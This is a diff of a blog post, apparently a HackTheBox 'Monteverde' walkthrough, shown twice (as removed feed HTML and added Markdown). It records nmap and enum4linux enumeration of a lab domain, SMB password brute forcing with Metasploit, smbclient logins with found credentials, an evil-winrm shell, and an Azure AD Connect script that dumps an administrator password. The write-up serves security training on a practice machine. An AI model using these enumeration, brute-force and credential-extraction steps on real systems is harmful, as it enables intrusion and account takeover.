-&lt;span class=&quot;nv&quot;&gt;Group 'Operations' (RID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;2609) has member&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;MEGABANK\smorgan&lt;/span&gt;
-
- &lt;span class=&quot;nv&quot;&gt;=======================================================================&lt;/span&gt; 
-&lt;span class=&quot;nv&quot;&gt;|    Users on 10.10.10.172 via RID cycling (RIDS&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;500-550&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;1000-1050)    |&lt;/span&gt;
- &lt;span class=&quot;nv&quot;&gt;=======================================================================&lt;/span&gt; 
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.&lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Couldn't get SID&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;NT_STATUS_ACCESS_DENIED.  RID cycling not possible.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.&lt;/span&gt;
-
- &lt;span class=&quot;nv&quot;&gt;=============================================&lt;/span&gt; 
-&lt;span class=&quot;nv&quot;&gt;|    Getting printer info for 10.10.10.172    |&lt;/span&gt;
- &lt;span class=&quot;nv&quot;&gt;=============================================&lt;/span&gt; 
-&lt;span class=&quot;nv&quot;&gt;Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED&lt;/span&gt;
-
-
-&lt;span class=&quot;nv&quot;&gt;enum4linux complete on Tue May 26 13&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;08 2020&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;On examining the above output, we were able to identify usernames being revealed in the output. To get the list of users, we issued the following command:&lt;/p&gt;
-
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;cat enum4linux | grep MEGABANK | cut -d &quot;:&quot; -f3 | cut -d '\' -f2 &amp;gt; user_list.txt&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;Guest&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;dgalanos&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;roleary&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Administrator&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;AAD_987d7f2f57d2&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;mhope&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Administrator&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;krbtgt&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;AAD_987d7f2f57d2&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;mhope&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;SABatchJobs&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;svc-ata&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;svc-bexec&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;svc-netapp&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;dgalanos&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;roleary&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;smorgan&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Administrator&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;smorgan&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt; &lt;/p&gt;
-
-&lt;h3 id=&quot;13--smb-brute-force&quot;&gt;1.3 || SMB Brute Force&lt;/h3&gt;
-
-&lt;p&gt;As the list of usernames was extracted, we’ll be trying to brute force the SMB service using &lt;strong&gt;&lt;em&gt;metasploit&lt;/em&gt;&lt;/strong&gt;. Using &lt;code class=&quot;highlighter-rouge&quot;&gt;auxiliary/scanner/smb/smb_login&lt;/code&gt; in metasploit and setting the options as shown in below screenshot:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/Monteverde/1.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/Monteverde/2.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt; &lt;/p&gt;
-
-&lt;h3 id=&quot;14--smb-enumeration&quot;&gt;1.4 || SMB Enumeration&lt;/h3&gt;
-
-&lt;p&gt;On SMB Brute forcing to the target macine, we were successfully able to get a legit set of credentials. To enumrate SMB, we’ll be using &lt;a href=&quot;&quot;&gt;smbclient&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Command Issued&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;smclient -U SABatchJobs%SABatchJobs -L //10.10.10.172/&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/Monteverde/3.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;On enumeration, we were able to access &lt;code class=&quot;highlighter-rouge&quot;&gt;users&lt;/code&gt; sharename and find a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;azure.xml&lt;/code&gt; under &lt;code class=&quot;highlighter-rouge&quot;&gt;mhope&lt;/code&gt; users folder consisting of password of the same user.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Command Issued&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;smclient -U SABatchJobs%SABatchJobs -L //10.10.10.172/users$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/Monteverde/4.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/Monteverde/5.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt; &lt;/p&gt;
-
-&lt;h2 id=&quot;2-low-privilege-shell&quot;&gt;2. Low-Privilege Shell&lt;/h2&gt;
-
-&lt;p&gt;We were able get Win-RM (Low-privilege) shell with the help of credentials found in the ealier stage using a tool name &lt;a href=&quot;&quot;&gt;evil-winrm&lt;/a&gt; and get &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; accordingly.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/Monteverde/6.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt; &lt;/p&gt;
-
-&lt;h2 id=&quot;3-privilege-escalation&quot;&gt;3. Privilege Escalation&lt;/h2&gt;
-
-&lt;h3 id=&quot;31--enumerate-local-system&quot;&gt;3.1 || Enumerate local system&lt;/h3&gt;
-
-&lt;p&gt;Our next step to get maximum level of privilege and in the process od doing so, we were able to discover the target machines uses &lt;code class=&quot;highlighter-rouge&quot;&gt;Azure AD&lt;/code&gt;. On searching for exploits with respect to &lt;code class=&quot;highlighter-rouge&quot;&gt;Azure AD&lt;/code&gt;, we were able to discover a script to create a new set of administrator credentials.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/Monteverde/7.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Uploading the script by using the upload functionality of evil-winrm and executing it by using the following steps and the scripts produces the administrator credentials:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/Monteverde/8.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Command Issued&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;./Azure-ADConnect.ps1&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;import-module ./Azure-ADConnect.ps1&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Azure-ADConnect -server 127.0.0.1 -db ADSync&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/Monteverde/9.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt; &lt;/p&gt;
-
-&lt;h3 id=&quot;32--privileged-shell&quot;&gt;3.2 || Privileged Shell&lt;/h3&gt;
-
-&lt;p&gt;Using the genrated credentials by the script (&lt;code class=&quot;highlighter-rouge&quot;&gt;administrator:d0m@in4adminyeah!&lt;/code&gt;), we were able to get the highest level of privilege of the machine.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/Monteverde/10.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt; &lt;/p&gt;
-
-&lt;h3 id=&quot;33--roottxt&quot;&gt;3.3 || root.txt&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/HTB/Monteverde/11.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;key-takeway&quot;&gt;Key Takeway:&lt;/h2&gt;
-
-&lt;p&gt;As the main motto to build HackTheBox platform for security researchers is to help us hone our testing skills and hence, every machine has its key takeways.&lt;/p&gt;
-
-&lt;p&gt;For me, the key takeway was a reminder for basic routine check of security misconfiguration where the password of one the users were set as the username itself.&lt;/p&gt;</content><author><name>Rajat Rao</name></author><category term="HackTheBox" /><summary type="html">Brief     On enumerating different services of Monteverde machine, we were able extract list of users available in the target machine. Due to security misconfiguration, one of the users has set the password same as the username and this was identified by brute forcing the same using smb_login module from metasploit. Levering the misconfiguration, we were able to login to SMB with the help of smbclient and on further enumeration, we were able to extract a file named azure.xml under mhope user folder consisting of credentails of the same user. Making the use of credential found, we were able to get Windows Remote Management shell with the help of tool named evil-winrm which targets on port 5985 port. Here, we were able to get basic shell and were able pwn the user.txt part of the challenge. Moving to privilege escalation part, enumemrating local system, we were able to understand the target machine has Azure Active Directory Connect. On searching for exploits on google, we were able to find a script and privilege to highest level of authorization and complete the final challenge of getting root.txt</summary></entry></feed>
+## 1. Information Gathering 
+&amp;nbsp;
+### 1.1 || Nmap 
+
+-&gt; `Run nmap`
+```yml
+$ nmap -sC -sV -p- -oA full 10.10.10.172
+```
+where, 
+
+&amp;nbsp; &amp;nbsp; -sC : Run Default Scripts
+
+&amp;nbsp; &amp;nbsp; -sV : Enumerate different versions
+
+&amp;nbsp; &amp;nbsp; -sC : Store the output in all format (.nmap, .xml and .gnmap) having name full
+
+**Result:**
+
+```yml
+
+# Nmap 7.80 scan initiated Tue May 26 14:02:41 2020 as: nmap -sC -sV -p- -oA full -Pn 10.10.10.172
+Nmap scan report for 10.10.10.172
+Host is up (0.13s latency).
+Not shown: 65516 filtered ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+   fingerprint-strings: 
+   DNSVersionBindReqTCP: 
+     version
+_    bind
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-26 07:53:02Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+ _http-server-header: Microsoft-HTTPAPI/2.0
+ _http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  msrpc         Microsoft Windows RPC
+49706/tcp open  msrpc         Microsoft Windows RPC
+49778/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=5/26%Time=5ECCD5D6%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03&quot;);
+Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+ _clock-skew: -46m43s
+  smb2-security-mode: 
+    2.02: 
+ _    Message signing enabled and required
+  smb2-time: 
+    date: 2020-05-26T07:55:26
+ _  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue May 26 14:14:49 2020 -- 1 IP address (1 host up) scanned in 728.28 seconds
+
+```
+&amp;nbsp;
+
+### 1.2 || enum4linux
+
+**Enum4linux** is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com. 
+&amp;nbsp;
+
+-&gt; `Run enum4linux`
+
+```yml
+enum4linux 10.10.10.172
+```
+
+**Result:**
+```yml
+enum4linux 10.10.10.172
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue May 26 13:41:48 2020
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.10.172
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==================================================== 
+|    Enumerating Workgroup/Domain on 10.10.10.172    |
+ ==================================================== 
+[E] Can't find workgroup/domain
+
+
+ ============================================ 
+|    Nbtstat Information for 10.10.10.172    |
+ ============================================ 
+Looking up status of 10.10.10.172
+No reply from 10.10.10.172
+
+ ===================================== 
+|    Session Check on 10.10.10.172    |
+ ===================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
+[+] Server 10.10.10.172 allows sessions using username '', password ''
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
+[+] Got domain/workgroup name: 
+
+ =========================================== 
+|    Getting domain SID for 10.10.10.172    |
+ =========================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
+Domain Name: MEGABANK
+Domain Sid: S-1-5-21-391775091-850290835-3566037492
+[+] Host is part of a domain (not a workgroup)
+
+ ====================================== 
+|    OS information on 10.10.10.172    |
+ ====================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 10.10.10.172 from smbclient: 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
+[+] Got OS info for 10.10.10.172 from srvinfo:
+Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+ ============================= 
+|    Users on 10.10.10.172    |
+ ============================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
+index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
+index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
+index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
+index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
+index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
+index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally MorganDesc: (null)
+index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
+index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
+index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
+user:[Guest] rid:[0x1f5]
+user:[AAD_987d7f2f57d2] rid:[0x450]
+user:[mhope] rid:[0x641]
+user:[SABatchJobs] rid:[0xa2a]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[svc-netapp] rid:[0xa2d]
+user:[dgalanos] rid:[0xa35]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+
+ ========================================= 
+|    Share Enumeration on 10.10.10.172    |
+ ========================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
+
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 10.10.10.172
+
+ ==================================================== 
+|    Password Policy Information for 10.10.10.172    |
+ ==================================================== 
+[E] Unexpected error from polenum:
+
+
+[+] Attaching to 10.10.10.172 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+	[!] Protocol failed: Cannot request session (Called Name:10.10.10.172)
+
+[+] Trying protocol 445/SMB...
+
+	[!] Protocol failed: Missing required parameter 'digestmod'.
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
+
+[+] Retieved partial password policy with rpcclient:
+
+Password Complexity: Disabled
+Minimum Password Length: 7
+
+
+ ============================== 
+|    Groups on 10.10.10.172    |
+ ============================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
+
+[+] Getting builtin groups:
+
+[+] Getting builtin group memberships:
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
+
+[+] Getting local groups:
+group:[Cert Publishers] rid:[0x205]
+group:[RAS and IAS Servers] rid:[0x229]
+group:[Allowed RODC Password Replication Group] rid:[0x23b]
+group:[Denied RODC Password Replication Group] rid:[0x23c]
+group:[DnsAdmins] rid:[0x44d]
+group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
+group:[ADSyncAdmins] rid:[0x451]
+group:[ADSyncOperators] rid:[0x452]
+group:[ADSyncBrowse] rid:[0x453]
+group:[ADSyncPasswordSet] rid:[0x454]
+
+[+] Getting local group memberships:
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
+Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
+Group 'ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
+
+[+] Getting domain groups:
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[DnsUpdateProxy] rid:[0x44e]
+group:[Azure Admins] rid:[0xa29]
+group:[File Server Admins] rid:[0xa2e]
+group:[Call Recording Admins] rid:[0xa2f]
+group:[Reception] rid:[0xa30]
+group:[Operations] rid:[0xa31]
+group:[Trading] rid:[0xa32]
+group:[HelpDesk] rid:[0xa33]
+group:[Developers] rid:[0xa34]
+
+[+] Getting domain group memberships:
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Group 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Group 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Group 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
+Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
+Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
+Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
+Group 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
+Group 'Domain Users' (RID: 513) has member: MEGABANK\mhope
+Group 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
+Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
+Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
+Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
+Group 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
+Group 'Domain Users' (RID: 513) has member: MEGABANK\roleary
+Group 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
+Group 'Operations' (RID: 2609) has member: MEGABANK\smorgan
+
+ ======================================================================= 
+|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ======================================================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
+[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
+
+ ============================================= 
+|    Getting printer info for 10.10.10.172    |
+ ============================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
+Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Tue May 26 13:46:08 2020
+
+```
+
+On examining the above output, we were able to identify usernames being revealed in the output. To get the list of users, we issued the following command:
+
+```yml
+cat enum4linux | grep MEGABANK | cut -d &quot;:&quot; -f3 | cut -d '\' -f2 &gt; user_list.txt
+```
+**Result**
+```yml
+Guest
+dgalanos
+roleary
+Administrator
+AAD_987d7f2f57d2
+mhope
+Administrator
+krbtgt
+AAD_987d7f2f57d2
+mhope
+SABatchJobs
+svc-ata
+svc-bexec
+svc-netapp
+dgalanos
+roleary
+smorgan
+Administrator
+smorgan
+```
+&amp;nbsp;
+
+### 1.3 || SMB Brute Force
+
+As the list of usernames was extracted, we'll be trying to brute force the SMB service using ***metasploit***. Using `auxiliary/scanner/smb/smb_login` in metasploit and setting the options as shown in below screenshot:
+
+![deploy using travis](/assets/img/posts/HTB/Monteverde/1.png){:class=&quot;img-fluid&quot;}  
+
+![deploy using travis](/assets/img/posts/HTB/Monteverde/2.png){:class=&quot;img-fluid&quot;}  
+
+&amp;nbsp;
+
+### 1.4 || SMB Enumeration
+
+On SMB Brute forcing to the target macine, we were successfully able to get a legit set of credentials. To enumrate SMB, we'll be using [smbclient]()
+
+**Command Issued**
+
+```yml
+smclient -U SABatchJobs%SABatchJobs -L //10.10.10.172/
+```
+
+![deploy using travis](/assets/img/posts/HTB/Monteverde/3.png){:class=&quot;img-fluid&quot;}  
+
+On enumeration, we were able to access `users` sharename and find a file named `azure.xml` under `mhope` users folder consisting of password of the same user.
+
+**Command Issued**
+
+```yml
+smclient -U SABatchJobs%SABatchJobs -L //10.10.10.172/users$
+```
+
+![deploy using travis](/assets/img/posts/HTB/Monteverde/4.png){:class=&quot;img-fluid&quot;}  
+
+![deploy using travis](/assets/img/posts/HTB/Monteverde/5.png){:class=&quot;img-fluid&quot;}  
+
+&amp;nbsp;
+
+## 2. Low-Privilege Shell 
+
+We were able get Win-RM (Low-privilege) shell with the help of credentials found in the ealier stage using a tool name [evil-winrm]() and get `user.txt` accordingly.
+
+![deploy using travis](/assets/img/posts/HTB/Monteverde/6.png){:class=&quot;img-fluid&quot;}  
+
+&amp;nbsp;
+
+## 3. Privilege Escalation
+
+### 3.1 || Enumerate local system
+
+Our next step to get maximum level of privilege and in the process od doing so, we were able to discover the target machines uses `Azure AD`. On searching for exploits with respect to `Azure AD`, we were able to discover a script to create a new set of administrator credentials.
+
+![deploy using travis](/assets/img/posts/HTB/Monteverde/7.png){:class=&quot;img-fluid&quot;}  
+
+Uploading the script by using the upload functionality of evil-winrm and executing it by using the following steps and the scripts produces the administrator credentials:
+
+
+![deploy using travis](/assets/img/posts/HTB/Monteverde/8.png){:class=&quot;img-fluid&quot;}  
+
+**Command Issued**
+
+```yml
+./Azure-ADConnect.ps1
+import-module ./Azure-ADConnect.ps1
+Azure-ADConnect -server 127.0.0.1 -db ADSync 
+```
+
